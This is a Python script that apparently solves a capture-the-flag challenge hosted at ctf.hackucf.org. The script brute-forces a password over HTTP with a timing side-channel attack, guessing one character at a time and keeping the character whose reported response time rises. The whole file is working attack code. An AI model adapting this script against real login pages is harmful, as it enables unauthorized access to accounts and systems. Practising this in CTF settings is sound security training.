#! /bin/python 

import requests as r
import string as s 
import sys
import re

DEBUG_PRINT = False

def cleanhtml(raw_html):
  cleanr = re.compile('<.*?>')
  cleantext = re.sub(cleanr, '', raw_html)
  return cleantext

ascii_chars = s.ascii_letters + s.digits
ascii_chars +=  "-_" # add the commonly used punctuation chars
url = "http://ctf.hackucf.org:4000/bad_code/bad_code.php"
get_param = "passwd"

minimum_response_time = 0.01
max_len_to_test = 15

correct_pwd = ""
password = []

last_response = ""
print("Running")
i=0
last_resp_time = minimum_response_time
while i in range(0, max_len_to_test):
    printed_index = False
    for char in ascii_chars:
        resp_time = 0
        if not printed_index:
            if DEBUG_PRINT:
                print("Testing chars for index:%d" % i)
            printed_index = True
        if len(password) <= i:
            # append the char to the current password being tested
            password.append(char)
        else:
            #just replace the last char tested
            password[i] = char
        params = {get_param: "".join(password)}
        resp = r.get(url = url, params = params)
        content = cleanhtml(str(resp.content))
        last_response = content
        if "wrong" not in content.lower():
            if DEBUG_PRINT:
                print("We got in!") # DEBUG
                print("Password: %s. \nResponse: %s" % ("".join(password), content)) # DEBUG    
            print(content.split(":")[-1].strip())
            exit(0)
        resp_time = round(float(content.split(":")[-1].strip().replace("'", "")), 3)
        if resp_time > last_resp_time + 0.01:
            if DEBUG_PRINT:
                print("We might have found a possible char: '%s'. Response time: %.03f" %(char, resp_time)) 
            correct_pwd += char
            last_resp_time = resp_time
            break
    i += 1
